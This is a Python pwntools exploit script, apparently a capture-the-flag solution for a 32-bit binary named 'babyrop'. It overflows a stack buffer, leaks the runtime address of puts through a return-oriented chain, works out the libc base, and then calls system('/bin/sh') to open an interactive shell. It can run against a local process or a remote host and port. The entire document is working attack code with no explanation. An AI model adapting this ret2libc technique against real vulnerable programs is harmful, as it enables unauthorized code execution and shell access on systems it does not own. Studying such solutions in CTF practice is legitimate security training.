#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './babyrop'
local_libc  = '/lib/i386-linux-gnu/libc.so.6'
remote_libc = './libc.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
# elf, libc

# rop1
offset = 32
payload = 'A'*offset
payload += 'ffff'

ru('Hello CTFer!\n')
sl(payload)
ru('What is your name?\n')

puts_got = elf.got['puts']
puts_plt = elf.symbols['puts']
read_plt = elf.symbols['read']
bss = elf.bss()
info_addr('bss',bss)

vuln = 0x0804853D
pl2 = 20*'B'
pl2+= p32(puts_plt) + p32(vuln) + p32(puts_got)

# debug()
sl(pl2)
sleep(1)

puts = u32(rc(4))
info_addr('puts',puts)
offset_system = libc.symbols['system']# 0x0003a940
offset_str_bin_sh = libc.search('/bin/sh').next() #0x15902b
offset_puts = libc.symbols['puts'] # 0x0005f140
libc_base = puts-offset_puts
system = libc_base + offset_system
binsh = libc_base + offset_str_bin_sh

ret = 0x0804839e # ret

ru('What is your name?\n')
pl3 = 20*'C'
pl3+= p32(ret) + p32(system) + p32(vuln) + p32(binsh)
debug()
sl(pl3)

# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

